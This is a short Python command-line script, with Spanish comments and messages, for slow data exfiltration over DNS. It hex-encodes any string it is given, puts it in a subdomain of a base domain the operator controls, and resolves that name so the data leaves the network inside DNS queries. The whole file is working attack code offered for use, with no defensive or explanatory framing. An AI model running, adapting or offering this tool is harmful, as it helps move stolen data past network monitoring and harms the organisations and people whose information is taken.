#!/usr/bin/env python3
"""Exfiltración lenta DNS codificando datos en subdominios."""
import binascii
import socket
import sys


def exfiltrar_datos_dns(dominio_base, string_datos):
    datos_hex = binascii.hexlify(string_datos.encode("utf-8")).decode("utf-8")
    subdominio_exfil = f"{datos_hex}.{dominio_base}"
    print(f"[*] Exfiltrando [{string_datos}] como: {subdominio_exfil}")
    try:
        socket.getaddrinfo(subdominio_exfil, 53)
    except socket.gaierror:
        pass
    print("[+] Consulta DNS enviada al resolvedor configurado")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 slow_dns.py <Dominio_Base> <Datos>")
        sys.exit(1)
    exfiltrar_datos_dns(sys.argv[1], sys.argv[2])
